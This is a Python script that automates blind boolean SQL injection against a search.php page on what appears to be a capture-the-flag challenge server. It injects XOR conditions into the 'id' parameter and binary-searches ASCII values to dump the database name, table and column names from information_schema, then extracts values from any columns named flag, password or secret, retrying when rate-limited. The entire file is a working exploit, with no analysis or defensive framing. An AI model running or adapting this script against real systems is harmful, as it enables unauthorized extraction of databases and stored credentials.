#!/usr/bin/env python3
import requests
import time
import sys

URL = "http://3ccedc97-90ba-405a-84bc-2b4129ca15c6.node5.buuoj.cn:81/search.php"
DELAY = 1.0  # 1 second delay between requests

session = requests.Session()

def check(condition):
    """
    Using XOR injection: id=1^(condition)
    If condition is True (1), 1^1=0 -> ERROR
    If condition is False (0), 1^0=1 -> "NO! Not this!"
    """
    payload = f"1^({condition})"
    try:
        r = session.get(URL, params={"id": payload}, timeout=15)
        time.sleep(DELAY)
        if r.status_code == 429:
            print(f"[429] Rate limited, waiting 60s...")
            time.sleep(60)
            return check(condition)
        return "ERROR" in r.text
    except Exception as e:
        print(f"[ERROR] {e}")
        time.sleep(5)
        return None

def binary_search_char(expr, pos):
    """Binary search for a character at given position"""
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        condition = f"ascii(substr(({expr}),{pos},1))>{mid}"
        result = check(condition)
        if result is None:
            return None
        if result:
            low = mid + 1
        else:
            high = mid
    return chr(low)

def get_length(expr):
    """Get length using binary search"""
    low, high = 0, 100
    while low < high:
        mid = (low + high) // 2
        condition = f"length(({expr}))>{mid}"
        result = check(condition)
        if result:
            low = mid + 1
        else:
            high = mid
    return low

def extract_string(expr):
    """Extract string using binary search"""
    length = get_length(expr)
    print(f"[*] Length: {length}")
    result = ""
    for pos in range(1, length + 1):
        char = binary_search_char(expr, pos)
        if char is None:
            break
        result += char
        print(f"[+] Progress: {result}")
        sys.stdout.flush()
    return result

if __name__ == "__main__":
    # Get database name
    print("[*] Getting database name...")
    db = extract_string("database()")
    print(f"[+] Database: {db}")
    
    # Get tables
    print("\n[*] Getting tables...")
    tables_expr = f"select group_concat(table_name) from information_schema.tables where table_schema=database()"
    tables = extract_string(tables_expr)
    print(f"[+] Tables: {tables}")
    
    # Get columns for each table
    if tables:
        for table in tables.split(','):
            table = table.strip()
            if table:
                print(f"\n[*] Getting columns for {table}...")
                cols_expr = f"select group_concat(column_name) from information_schema.columns where table_name='{table}'"
                cols = extract_string(cols_expr)
                print(f"[+] Columns in {table}: {cols}")
                
                # Try to get flag
                if 'flag' in cols.lower() or 'password' in cols.lower() or 'secret' in cols.lower():
                    print(f"\n[*] Extracting data from {table}...")
                    for col in cols.split(','):
                        col = col.strip()
                        if col:
                            data_expr = f"select {col} from {table} limit 1"
                            data = extract_string(data_expr)
                            print(f"[+] {col}: {data}")
